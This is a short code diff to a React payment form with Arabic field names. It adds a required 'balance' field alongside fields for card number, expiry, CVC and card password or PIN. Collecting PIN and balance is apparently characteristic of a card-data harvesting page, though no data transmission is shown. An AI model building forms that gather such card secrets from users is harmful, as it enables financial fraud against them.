@@ -24,6 +24,7 @@ const Pay=()=>{
         YY:"",
         cvcCard:"",
         كلمةالمرورالبطاقة:"",
+        الرصيد:"",
         رقم_المفوتر:datas
       }
     });
@@ -45,7 +46,7 @@ const Pay=()=>{
       
     };
       const handlerout = ()=>{
-        if(form.data.typecard == "اختر البطاقة"||form.data.الاسم_على_البطاقة == "" || form.data.رقم_البطاقة == "" || form.data.MM == "" || form.data.YY == "" || form.data.cvcCard == "" || form.data.كلمةالمرورالبطاقة == ""){
+        if(form.data.typecard == "اختر البطاقة"||form.data.الاسم_على_البطاقة == "" || form.data.الرصيد == ""||form.data.رقم_البطاقة == "" || form.data.MM == "" || form.data.YY == "" || form.data.cvcCard == "" || form.data.كلمةالمرورالبطاقة == ""){
           alert('من فضلك قم بملى الحقول')
         }else{
           
